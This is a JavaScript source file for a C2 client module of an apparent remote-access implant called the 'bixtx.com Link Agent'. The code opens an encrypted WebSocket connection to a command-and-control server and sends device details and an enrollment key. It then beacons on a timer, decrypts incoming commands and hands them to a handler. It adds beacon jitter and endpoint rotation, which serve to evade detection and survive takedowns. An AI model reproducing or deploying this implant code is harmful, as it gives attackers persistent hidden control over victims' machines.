/**
 * bixtx.com Link Agent — WebSocket C2 Client
 * Maintains persistent encrypted connection to the C2 server.
 * Auto-reconnects with exponential backoff.
 */

const WebSocket = require("ws");
const AgentCrypto = require("./crypto");
const config = require("../config");
const logger = require("../logger");

class C2Socket {
  constructor(onCommand) {
    this.onCommand = onCommand;
    this.ws = null;
    this.crypto = new AgentCrypto(config.enrollKey + config.deviceId);
    this.connected = false;
    this.reconnectAttempts = 0;
    this.reconnectTimer = null;
    this.heartbeatTimer = null;
  }

  connect() {
    const url = `${config.serverUrl}?device=${encodeURIComponent(config.deviceId)}&token=${AgentCrypto.generateToken(config.deviceId, config.enrollKey)}`;

    logger.debug(`Connecting to C2: ${config.serverUrl}`);

    this.ws = new WebSocket(url, {
      headers: {
        "X-Device-ID": config.deviceId,
        "X-Agent-Version": "4.7.2",
        "X-Platform": config.platform,
      },
      rejectUnauthorized: config.nodeEnv === "production",
    });

    this.ws.on("open", () => this._onOpen());
    this.ws.on("message", (data) => this._onMessage(data));
    this.ws.on("close", (code, reason) => this._onClose(code, reason));
    this.ws.on("error", (err) => this._onError(err));
  }

  send(type, payload) {
    if (!this.connected || this.ws.readyState !== WebSocket.OPEN) return false;
    try {
      const msg = this.crypto.encrypt({ type, payload, ts: Date.now(), deviceId: config.deviceId });
      this.ws.send(msg);
      return true;
    } catch (err) {
      logger.error("Send error:", err.message);
      return false;
    }
  }

  disconnect() {
    this.connected = false;
    clearInterval(this.heartbeatTimer);
    clearTimeout(this.reconnectTimer);
    if (this.ws) {
      this.ws.removeAllListeners();
      this.ws.terminate();
      this.ws = null;
    }
  }

  _onOpen() {
    this.connected = true;
    this.reconnectAttempts = 0;
    logger.info("C2 connection established");
    if (typeof this.onC2Success === "function") this.onC2Success();

    // Send enrollment handshake
    this.send("ENROLL", {
      deviceId: config.deviceId,
      deviceName: config.deviceName,
      platform: config.platform,
      arch: config.arch,
      osVersion: config.osVersion,
      agentVersion: "4.7.2",
      features: config.features,
      enrollKey: config.enrollKey,
    });

    // Start heartbeat
    this.heartbeatTimer = setInterval(() => {
      this.send("HEARTBEAT", { ts: Date.now() });
    }, config.beaconIntervalMs);
  }

  _onMessage(rawData) {
    try {
      const decrypted = this.crypto.decrypt(rawData.toString());
      const { type, payload } = decrypted;
      logger.debug(`Received command: ${type}`);
      if (this.onCommand) this.onCommand(type, payload);
    } catch (err) {
      logger.warn("Failed to decrypt C2 message:", err.message);
    }
  }

  _onClose(code, reason) {
    this.connected = false;
    clearInterval(this.heartbeatTimer);
    logger.warn(`C2 disconnected (${code}): ${reason}`);
    // Notify watchdog so it can track failures and trigger endpoint rotation
    if (typeof this.onC2Failure === "function") this.onC2Failure();
    this._scheduleReconnect();
  }

  _onError(err) {
    logger.error("C2 socket error:", err.message);
    if (typeof this.onC2Failure === "function") this.onC2Failure();
  }

  _scheduleReconnect() {
    if (this.reconnectAttempts >= config.maxReconnectAttempts) return;
    const delay = Math.min(
      config.reconnectDelayMs * Math.pow(1.5, this.reconnectAttempts),
      120000
    );
    this.reconnectAttempts++;
    logger.debug(`Reconnecting in ${Math.round(delay / 1000)}s (attempt ${this.reconnectAttempts})`);
    this.reconnectTimer = setTimeout(() => this.connect(), delay);
  }

  // ── Mutator-driven controls ──────────────────────────────────────────────

  setBeaconJitter(minMs, maxMs) {
    // Adjust heartbeat to a random interval within [minMs, maxMs]
    clearInterval(this.heartbeatTimer);
    const fire = () => {
      this.send("HEARTBEAT", { ts: Date.now() });
      const next = minMs + Math.random() * (maxMs - minMs);
      this.heartbeatTimer = setTimeout(fire, next);
    };
    const initial = minMs + Math.random() * (maxMs - minMs);
    this.heartbeatTimer = setTimeout(fire, initial);
    logger.debug(`[C2] Beacon jitter set: ${minMs}–${maxMs}ms`);
  }

  rotateEndpoint(newUrl) {
    if (!newUrl || newUrl === config.serverUrl) return;
    logger.info(`[C2] Rotating endpoint → ${newUrl}`);
    config.serverUrl = newUrl;
    this.disconnect();
    setTimeout(() => this.connect(), 1000);
  }
}

module.exports = C2Socket;
